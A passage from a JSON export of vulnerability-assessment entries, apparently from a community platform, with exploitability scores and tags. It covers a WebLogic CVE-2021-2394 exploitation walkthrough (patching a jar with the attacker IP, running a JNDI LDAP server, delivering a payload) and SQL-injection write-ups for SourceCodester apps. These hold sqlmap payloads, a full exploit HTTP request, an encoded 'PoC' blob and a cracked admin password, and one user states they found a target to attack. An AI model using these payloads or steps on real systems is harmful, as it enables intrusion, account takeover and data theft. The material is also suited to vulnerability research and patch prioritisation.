following article describes the [network issues faced](https://xz.aliyun.com/t/7498) when attempting to run the PoC in a virtualized 10.3.6.0 environment:\r\n>8.5. Summary of the problem\r\nWhen requesting NameService from Weblogic through the IIOP protocol, Weblogic directly uses the local ip address as the bind address to construct the address information reply, the client resolves the address information, and directly accesses the address when bind, but the bind fails due to the inability to access the real intranet address .\r\n\r\nThe PoC is written for 12.2.1.3.0 so rewriting the processing logic is slightly different though the principle is the same. WebLogic\u2019s package structure in 12.x is much different than in 10.x. The tutorial above instructs to hard code the attacking IP in `wlfullclient.jar!\\weblogic\\iiop\\IOPProfile.class`, although you may notice that class/ parent jar is non-existent in 12.2.1.3.0.\r\n\r\nIf you run the PoC without making any changes to WebLogic you should see the following stack trace:\r\n![stacktrace_IORManager](https://user-images.githubusercontent.com/23320005/140426002-43a52b65-1467-45f3-8c7a-069fcd4e0a46.png)\r\n\r\nFrom which we deduce the issue likely resides in: `weblogic.iiop.IORManager.locateNameService(IORManager.java:119) ` based on the problem summary above.\r\nI found [Recaf](https://github.com/Col-E/Recaf) useful for editing the compiled java code above. Either download and compile from source or download one of the releases. Note it mentions if you run Recaf with java 8 there are a number of prerequisites that must be satisfied in order for it to run smoothly. To avoid this warning you can download the latest java 11 and run with it:\r\n - Copy the jar that IORManager.class resides in from the container to the host: ```docker cp weblogic_12:/u01/app/oracle/middleware/wlserver/modules/com.oracle.weblogic.iiop.jar ./```\r\n - Start recaf with java 11:\r\n ```\r\n/home/msfuser/jdk-11.0.13/bin/java -jar recaf-2.21.3-J8-jar-with-dependencies.jar```\r\n - Locate and open IORManager.class in `classes/weblogic/iiop/IORManager.class` and open it by double clicking:\r\n![sourcecode_before](https://user-images.githubusercontent.com/23320005/140428227-946964a9-6410-4825-947b-eb43e49eb34a.png)\r\nThe highlighted line above is where weblogic gets the incorrect host address due to containerization and is the line that will need to be edited.\r\n - Right click method name `createInitialReference` and select `Edit with assembler`. Scroll down to where the parameters that are passed to IORManger.create start getting pushed onto the stack\r\n![bytecode_before](https://user-images.githubusercontent.com/23320005/140430853-4f13c9d3-0b02-4ffc-93b9-5a0dbf92597f.png)\r\n - Make the following changes in order to hardcode the IP address of the attacking machine:\r\n![bytecode_after](https://user-images.githubusercontent.com/23320005/140437880-46d83381-8584-40a5-a573-c7978b99fca5.png)\r\n - Copy the edited jar back to the container: ```docker cp com.oracle.weblogic.iiop.jar weblogic_12:/u01/app/oracle/middleware/wlserver/modules/com.oracle.weblogic.iiop.jar```\r\n\r\n### 3. Setup LDAP server\r\n\r\nFor the LDAP server used for JNDI injection, the following [github repository](https://github.com/welk1n/JNDI-Injection-Exploit) is quite useful. Build from source or download the release. Run the following command to start the server. Note the JDK 1.8 LDAP URL, as it needs to be passed to the exploit. \r\n\r\n![start_ldap_server](https://user-images.githubusercontent.com/23320005/140440699-54bdae3a-c86a-48b4-b255-8600b45c93d5.png)\r\n\r\n## 4. Run the PoC\r\n\r\nDownload the [PoC](https://github.com/lz2y/CVE-2021-2394) and run the following command:\r\n![poc_run_success](https://user-images.githubusercontent.com/23320005/140442129-414aaf4b-57ec-4541-a5e0-11b33a85b873.png)\r\n\r\nNote we no longer get the stack trace, instead non-English characters that Google translate\u2019s to: \r\n>\u201cThe package is successfully issued, please check whether the use is successful\u201d\r\n\r\nCheck the container\u2019s tmp folder:\r\n![boom_goes_the_dynamite](https://user-images.githubusercontent.com/23320005/140442458-300d9e74-ad39-44de-ab3a-601544ead8b2.png)\r\nNote that the payload was successfully delivered.\r\n\r\n# References\r\n\r\nVuln Analysis\r\nhttps://mp.weixin.qq.com/s/onoMpyenDkMmsoGEw8VO2A\r\nhttps://mp.weixin.qq.com/s/onoMpyenDkMmsoGEw8VO2A\t\r\nhttps://mp.weixin.qq.com/s/AxJJxbkclr4ijXX8lpNAfw\r\nhttps://github.com/rufherg/WebLogic_Basic_Poc/blob/master/poc/CVE_2020_14645.java \r\nhttps://github.com/rufherg/WebLogic_Basic_Poc/blob/master/poc/CVE_2020_14825.java\r\nhttps://github.com/Y4er/CVE-2020-14756/blob/main/CVE_2020_14756.java\r\nhttps://github.com/lz2y/CVE-2021-2394/blob/main/CVE_2021_2394.java\r\n\r\nPoC Testing\r\nhttps://l3yx.github.io/2020/04/22/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/\r\nhttps://xz.aliyun.com/t/7498\r\nhttps://www.cnblogs.com/ph4nt0mer/archive/2019/10/31/11772709.html \r\n\r\n\r\n\r\n\r\n\r\n\r\n",
      "score": 5,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "5972adc2-ec0f-491f-b604-3d854095cf59",
      "editorId": "e43d5db3-b640-4e82-ab20-2da0deb800f2",
      "topicId": "99653edb-72b9-4aad-9c08-52eaa7a5b108",
      "created": "2021-11-15T21:46:05.70788Z",
      "revisionDate": "2021-11-15T21:46:05.7058Z",
      "document": "found a target and about to attack.  will feedback soon",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "ef996ebb-669c-4cb6-b45f-ca28c7f761ee",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "442668e2-e9ba-4f30-80f7-0a1bd874b5ad",
      "created": "2021-11-16T08:50:24.00967Z",
      "revisionDate": "2023-05-17T08:19:53.783322Z",
      "document": "## [CVE-2021-42580](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42580)\r\n\r\n## [Vendor](https://www.sourcecodester.com/php/14929/online-learning-system-v2-using-php-free-source-code.html)\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2021-42580/docs/Screenshot%202021-11-16%20102805-wall.png)\r\n\r\n## Description:\r\nSourcecodester Online Learning System 2.0 is vulnerable to SQL injection authentication bypass in the admin login file (/admin/login.php).\r\nAfter exploiting the admin account by using SQL-malicious payload the attacker can take a PHPSESSID by using XSS-Stored attack and can take control again and again and again. So awful...\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-mitre/edit/main/CVE-2021-42580)\r\n\r\n## Proof:\r\n[href](https://www.nu11secur1ty.com/2021/11/cve-2021-42580.html)",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "54d7cb29-6ea5-4519-b4d5-01969793c3c2",
      "editorId": "e426cc12-067c-41a8-83c0-029757da0dbf",
      "topicId": "61f06e4e-550e-4177-86ce-08a2348eecb3",
      "created": "2021-11-16T16:45:15.074455Z",
      "revisionDate": "2021-11-16T22:26:41.479475Z",
      "document": "Exploitation is fairly trivial, but dumping all of the useful tables gets more involved. As @NinjaOperator mentioned, this vulnerability has been used to deploy ransomware in the past, so I'm rating this as fairly high in terms of exploitability. The documentation for BillQuick setup and installation uses the `sa` user's credentials, meaning that it's likely that customers are doing the same. Attackers can go further with this vulnerability and achieve code execution as a result of this. I'm not aware of any public PoC for achieving RCE with this vuln, but patching should be prioritized.",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "a45d0a44-2b32-41db-865d-133391d20d12",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "6c1dcc20-f713-4c2c-b563-1c1f305d2916",
      "created": "2021-11-17T09:33:36.766021Z",
      "revisionDate": "2023-05-17T08:07:07.481843Z",
      "document": "## [CVE-2021-42667](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42667)\r\n\r\n## [Vendor](https://www.sourcecodester.com/php/14241/online-event-booking-and-reservation-system-phpmysql.html)\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2021-42667/docs/Screenshot%202021-11-17%20105917.png)\r\n\r\n## Payloads:\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2021-42667/docs/Screenshot%202021-11-17%20105950-payloads.png)\r\n\r\n## Description:\r\nThe ID parameter from Online Event Booking and Reservation System 2.3.0 appears to be vulnerable to SQL injection attacks. SQL injection is 4 types.\r\nThe malicious user can bypass the database and he can dump all database information then he can access all accounts which this system has! The attacker can take sensitive information and can exploit the users of this system. Conclusion: awful status...\r\nBR nu11secur1ty \r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-mitre/edit/main/CVE-2021-42667)\r\n\r\n## Proof:\r\n[href](https://www.nu11secur1ty.com/2021/11/cve-2021-42667.html)",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "55dfabc6-e770-496d-9fb2-856530e79702",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "cee39581-b42e-4479-a48a-8aae1e939d44",
      "created": "2021-11-18T10:17:38.778985Z",
      "revisionDate": "2023-05-17T08:05:53.937696Z",
      "document": "## [CVE-2021-42665](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42665)\r\n\r\n## [Vendor](https://www.sourcecodester.com/php/13115/engineers-online-portal-php.html)\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2021-42665/docs/ps_portal.png)\r\n\r\n## Description:\r\n\r\nAn SQL Injection vulnerability exists in Sourcecodester Engineers Online Portal in PHP via the login form inside of index.php, which can allow an attacker to bypass authentication.\r\nAnd five more SQL - Injections, the attacker can bypass all accounts of this system and he can manipulate those accounts with\r\nmalicious purposes and destroy the owners of these accounts. This system also has six more XSS: 4 reflected and 2 (CSRF) vulnerabilities!\r\nStatus: Critical and extremely awful! \r\nConclusion: This system must be stopped from distribution immediately! BR nu11secur1ty\r\n\r\n## Types of SQL Injections:\r\n\r\n```mysql\r\n---\r\nParameter: firstname (POST)\r\n    Type: boolean-based blind\r\n    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)\r\n    Payload: firstname=tbcRxVrk' OR NOT 6030=6030#&lastname=tbcRxVrk&department_id='&username=tbcRxVrk&password=x6P!w4r!A0&cpassword=x6P!w4r!A0\r\n\r\n    Type: error-based\r\n    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)\r\n    Payload: firstname=tbcRxVrk' AND (SELECT 4603 FROM(SELECT COUNT(*),CONCAT(0x716b717671,(SELECT (ELT(4603=4603,1))),0x717a627a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- upfj&lastname=tbcRxVrk&department_id='&username=tbcRxVrk&password=x6P!w4r!A0&cpassword=x6P!w4r!A0\r\n\r\n    Type: time-based blind\r\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\r\n    Payload: firstname=tbcRxVrk' AND (SELECT 2357 FROM (SELECT(SLEEP(5)))mNaQ)-- xKTb&lastname=tbcRxVrk&department_id='&username=tbcRxVrk&password=x6P!w4r!A0&cpassword=x6P!w4r!A0\r\n---\r\n```\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-mitre/edit/main/CVE-2021-42665)\r\n\r\n## Proof:\r\n[href](https://www.nu11secur1ty.com/2021/11/cve-2021-42665.html)",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "9bcec1b6-d362-4298-936b-a253b57ef7e8",
      "editorId": "0273b855-eab2-4a09-a17a-d1fe5aa68e83",
      "topicId": "d998617c-a06a-47cf-9639-df2909273c7b",
      "created": "2021-11-19T02:40:14.231722Z",
      "revisionDate": "2021-11-19T02:40:36.019119Z",
      "document": "Active POCs are already being shared and can be used to exploit vulnerable sharepoint servers\r\n\r\nhttps://github.com/0x0021h/expbox/blob/main/cve-2021-41349-poc.py",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Initial Access"
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        }
      ]
    },
    {
      "id": "40aaae68-2dfc-4000-ac5f-4e95abe97a3d",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "8591b06e-bcc6-4619-a6ca-48fcd837b546",
      "created": "2021-11-19T11:33:34.659675Z",
      "revisionDate": "2021-11-19T11:34:40.696637Z",
      "document": "## [CVE-nu11-20-100121](https://www.sourcecodester.com/php/14959/companys-recruitment-management-system-php-and-sqlite-free-source-code.html)\r\n## [CVE-2021-41931](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41931)\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-nu11secur1ty/main/vendors/oretnom23/CVE-nu11-20-100121/docs/public_3.png)\r\n\r\n\r\n## Description of vulnerability:\r\nThe Company's Recruitment Management System (by: oretnom23) in id=2 of the parameter from view_vacancy app on-page appears to be vulnerable to SQL Injection - Stealing the Password Hashes attacks. \r\nThe payloads 19424269' or '1309'='1309 and 39476597' or '2917'='2923 were each submitted in the id parameter. \r\nThese two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way.\r\n\r\n## Description of the exploit:\r\n\r\n```cmd\r\nExploit Title: Recruitment Management System is vulnerable to MyQSL injection - Stealing the Password Hashes attacks.\r\nDate: 2021-10-01\r\nExploit Author: nu11secur1ty\r\nVendor Homepage: https://www.sourcecodester.com/user/257130/activity\r\nSoftware Link: https://www.sourcecodester.com/php/14959/companys-recruitment-management-system-php-and-sqlite-free-source-code.html\r\nVersion: (by: oretnom23) dev\r\n```\r\n\r\n- MySQL Request:\r\n\r\n```cmd\r\nGET /employment_application/?page=view_vacancy&id=219424269'%20or%20'1309'%3d'1309 HTTP/1.1\r\nHost: 192.168.1.180\r\nCookie: PHPSESSID=oku6deve0oo3qbrbbprp5jnb6j\r\nUpgrade-Insecure-Requests: 1\r\nReferer: http://192.168.1.180/employment_application/?page=vacancy\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nAccept-Language: en-US,en-GB;q=0.9,en;q=0.8\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36\r\nConnection: close\r\nCache-Control: max-age=0\r\n```\r\n\r\n- MySQL Respond\r\n\r\n```cmd\r\nHTTP/1.1 200 OK\r\nDate: Fri, 01 Oct 2021 09:37:56 GMT\r\nServer: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.22\r\nX-Powered-By: PHP/7.4.22\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate\r\nPragma: no-cache\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\nContent-Length: 12044\r\n\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n<head>\r\n<meta charset=\"UTF-8\">\r\n<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\r\n...[SNIP]...\r\n<h5 class=\"card-title fw-bold wow\">Sample Vacancy 101</h5>\r\n...[SNIP]...\r\n<div class=\"fs-5 ps-4\">IT Depatment</div>\r\n...[SNIP]...\r\n<div class=\"fs-5 ps-4\">Jr. Web Developer</div>\r\n...[SNIP]...\r\n<span class=\"badge bg-success rounded-pill\">3</span>\r\n...[SNIP]...\r\n<div class=\"fs-6 ps-4\"><p style=\"margin-right: 0px; margin-bottom: 15px; margin-left: 0px; padding: 0px; text-align: justify; font-family: &quot;Open Sans&quot;, Arial, sans-serif; font-size: 14px;\">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Proin pretium vel tortor id semper. Donec ultrices sagittis euismod. Pellentesque ultrices lectus in suscipit ultricies. Morbi eget erat enim. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Mauris nec ex non lectus interdum interdum sit amet in lacus. Maecenas eu nulla nec nisi bibendum euismod in a nibh. Nullam quis gravida turpis. Donec hendrerit sagittis arcu quis mollis. Quisque pretium est in turpis pulvinar, nec pellentesque sem sagittis. Quisque ultrices molestie risus id varius. Vivamus sed efficitur erat, quis cursus massa. In in varius purus. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia curae; Quisque eget cursus nunc. Aenean semper neque velit, quis ullamcorper justo efficitur id.</p><p style=\"margin-right: 0px; margin-bottom: 15px; margin-left: 0px; padding: 0px; text-align: justify; font-family: &quot;Open Sans&quot;, Arial, sans-serif; font-size: 14px;\"><b>Qualification:</b></p><ul><li style=\"margin-right: 0px; margin-bottom: 15px; margin-left: 0px; padding: 0px; text-align: justify; font-family: &quot;Open Sans&quot;, Arial, sans-serif; font-size: 14px;\">Qualification 1</li><li style=\"margin-right: 0px; margin-bottom: 15px; margin-left: 0px; padding: 0px; text-align: justify; font-family: &quot;Open Sans&quot;, Arial, sans-serif; font-size: 14px;\">Qualification 2</li><li style=\"margin-right: 0px; margin-bottom: 15px; margin-left: 0px; padding: 0px; text-align: justify; font-family: &quot;Open Sans&quot;, Arial, sans-serif; font-size: 14px;\">Qualification 3<br></li></ul><p style=\"margin-right: 0px; margin-bottom: 15px; margin-left: 0px; padding: 0px; text-align: justify; font-family: &quot;Open Sans&quot;, Arial, sans-serif; font-size: 14px;\">In ut ligula et erat ullamcorper imperdiet. Pellentesque vitae justo facilisis, gravida sapien quis, mollis urna. Proin eu aliquam justo. Cras malesuada, nunc ac varius dapibus, orci ante pretium elit, non porta augue lectus sit amet orci. Ut ac porta mauris. Donec venenatis nisi sit amet massa sollicitudin lobortis. Quisque eros lectus, blandit et dapibus eu, gravida a risus. Vivamus sodales rutrum purus ac dictum. Integer massa velit, facilisis at leo vitae, semper congue mi. Vivamus bibendum sem eget porta tristique. Nunc nisl odio, pellentesque nec pellentesque quis, consequat ut neque. Sed elementum vel augue malesuada ultrices. Nullam dapibus mattis leo vitae laoreet.</p></div>\r\n...[SNIP]...\r\n```\r\n\r\n- PoC `r0n1n.bat`\r\n\r\n```bat\r\nXvL5vVDYAJj4HVMbIvtHb6RMoVRD9iM5nNOr2XqhOpGam2eUj8ytNzzaJyLI+Pv0MtFALO1RllnynHT6Odr38k3iyKIyTN+FszTfPrdRuHJlBKLn79q7ClWCQwWKYtTOXSPGgaKHIyxQz6RR+8JV9FQMmUjHtus7ENGSGsbL8RJIHfCVRqH6xb8tpXPJILc4gIn7mseYxiLp8x7s5Q4QhGXnHvhrsj7lE6jqTQmphumt3gQmBvxlhQILxBKGSG5ZxoVleq4xR/aUiivIiejShajuYChPXHzDF3g/e41aX4BpHa3iQsf390FP+m+FKrpeNPSZUcQAy48EwgEdHNz04yblTBo5sS5ywV5ej+3ZmiwVALH6MSvnLG3mTqglNXSc4+/MkxxmuPrn0Xbe5EZnuGjZTAnWFqfzQJjwy3A8gI2AQWH+RAR2CdWCRzr6hB0rFYJlPrFOKWAgpPB92HfUsQ==\r\n```\r\n\r\n## Decrypt of the password\r\nThe password is based on PHP md5() function. So, MD5 reverse for 0192023a7bbd73250516f069df18b500 is admin123\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/edit/main/vendors/oretnom23/CVE-nu11-20-100121)\r\n\r\n## Proof:\r\n[href](https://streamable.com/ucewhd)\r\n\r\n- Music: - UKF\r\n\r\n## BR @nu11secur1ty",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "a0f1bd9a-5459-49a7-9f89-194a1107cea5",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "83679a31-35f9-432e-a2c5-9a6c324af363",
      "created": "2021-11-19T14:35:00.843997Z",
      "revisionDate": "2021-11-19T14:35:00.843099Z",
      "document": "## [CVE-nu11-20-100121](https://www.sourcecodester.com/php/14959/companys-recruitment-management-system-php-and-sqlite-free-source-code.html)\r\n## [CVE-2021-41931](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41931)\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-nu11secur1ty/main/vendors/oretnom23/CVE-nu11-20-100121/docs/public_3.png)\r\n\r\n\r\n## Description of vulnerability:\r\nThe Company's Recruitment Management System (by: oretnom23) in id=2 of the parameter from view_vacancy app on-page appears to be vulnerable to SQL Injection - Stealing the Password Hashes attacks. \r\nThe payloads 19424269' or '1309'='1309 and 39476597' or '2917'='2923 were each submitted in the id parameter. \r\nThese two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way.\r\n\r\n## Description of the exploit:\r\n\r\n```cmd\r\nExploit Title: Recruitment Management System is vulnerable to MyQSL injection - Stealing the Password Hashes attacks.\r\nDate: 2021-10-01\r\nExploit Author: nu11secur1ty\r\nVendor Homepage: https://www.sourcecodester.com/user/257130/activity\r\nSoftware Link: https://www.sourcecodester.com/php/14959/companys-recruitment-management-system-php-and-sqlite-free-source-code.html\r\nVersion: (by: oretnom23) dev\r\n```\r\n\r\n- MySQL Request:\r\n\r\n```cmd\r\nGET /employment_application/?page=view_vacancy&id=219424269'%20or%20'1309'%3d'1309 HTTP/1.1\r\nHost: 192.168.1.180\r\nCookie: PHPSESSID=oku6deve0oo3qbrbbprp5jnb6j\r\nUpgrade-Insecure-Requests: 1\r\nReferer: http://192.168.1.180/employment_application/?page=vacancy\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nAccept-Language: en-US,en-GB;q=0.9,en;q=0.8\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36\r\nConnection: close\r\nCache-Control: max-age=0\r\n```\r\n\r\n- MySQL Respond\r\n\r\n```cmd\r\nHTTP/1.1 200 OK\r\nDate: Fri, 01 Oct 2021 09:37:56 GMT\r\nServer: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.22\r\nX-Powered-By: PHP/7.4.22\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate\r\nPragma: no-cache\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\nContent-Length: 12044\r\n\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n<head>\r\n<meta charset=\"UTF-8\">\r\n<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\r\n...[SNIP]...\r\n<h5 class=\"card-title fw-bold wow\">Sample Vacancy 101</h5>\r\n...[SNIP]...\r\n<div class=\"fs-5 ps-4\">IT Depatment</div>\r\n...[SNIP]...\r\n<div class=\"fs-5 ps-4\">Jr. Web Developer</div>\r\n...[SNIP]...\r\n<span class=\"badge bg-success rounded-pill\">3</span>\r\n...[SNIP]...\r\n<div class=\"fs-6 ps-4\"><p style=\"margin-right: 0px; margin-bottom: 15px; margin-left: 0px; padding: 0px; text-align: justify; font-family: &quot;Open Sans&quot;, Arial, sans-serif; font-size: 14px;\">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Proin pretium vel tortor id semper. Donec ultrices sagittis euismod. Pellentesque ultrices lectus in suscipit ultricies. Morbi eget erat enim. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Mauris nec ex non lectus interdum interdum sit amet in lacus. Maecenas eu nulla nec nisi bibendum euismod in a nibh. Nullam quis gravida turpis. Donec hendrerit sagittis arcu quis mollis. Quisque pretium est in turpis pulvinar, nec pellentesque sem sagittis. Quisque ultrices molestie risus id varius. Vivamus sed efficitur erat, quis cursus massa. In in varius purus. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia curae; Quisque eget cursus nunc. Aenean semper neque velit, quis ullamcorper justo efficitur id.</p><p style=\"margin-right: 0px; margin-bottom: 15px; margin-left: 0px; padding: 0px; text-align: justify; font-family: &quot;Open Sans&quot;, Arial, sans-serif; font-size: 14px;\"><b>Qualification:</b></p><ul><li style=\"margin-right: 0px; margin-bottom: 15px; margin-left: 0px; padding: 0px; text-align: justify; font-family: &quot;Open Sans&quot;, Arial, sans-serif; font-size: 14px;\">Qualification 1</li><li style=\"margin-right: 0px; margin-bottom: 15px; margin-left: 0px; padding: 0px; text-align: justify; font-family: &quot;Open Sans&quot;, Arial, sans-serif; font-size: 14px;\">Qualification 2</li><li style=\"margin-right: 0px; margin-bottom: 15px; margin-left: 0px; padding: 0px; text-align: justify; font-family: &quot;Open Sans&quot;, Arial, sans-serif; font-size: 14px;\">Qualification 3<br></li></ul><p style=\"margin-right: 0px; margin-bottom: 15px; margin-left: 0px; padding: 0px; text-align: justify; font-family: &quot;Open Sans&quot;, Arial, sans-serif; font-size: 14px;\">In ut ligula et erat ullamcorper imperdiet. Pellentesque vitae justo facilisis, gravida sapien quis, mollis urna. Proin eu aliquam justo. Cras malesuada, nunc ac varius dapibus, orci ante pretium elit, non porta augue lectus sit amet orci. Ut ac porta mauris. Donec venenatis nisi sit amet massa sollicitudin lobortis. Quisque eros lectus, blandit et dapibus eu, gravida a risus. Vivamus sodales rutrum purus ac dictum. Integer massa velit, facilisis at leo vitae, semper congue mi. Vivamus bibendum sem eget porta tristique. Nunc nisl odio, pellentesque nec pellentesque quis, consequat ut neque. Sed elementum vel augue malesuada ultrices. Nullam dapibus mattis leo vitae laoreet.</p></div>\r\n...[SNIP]...\r\n```\r\n\r\n- PoC 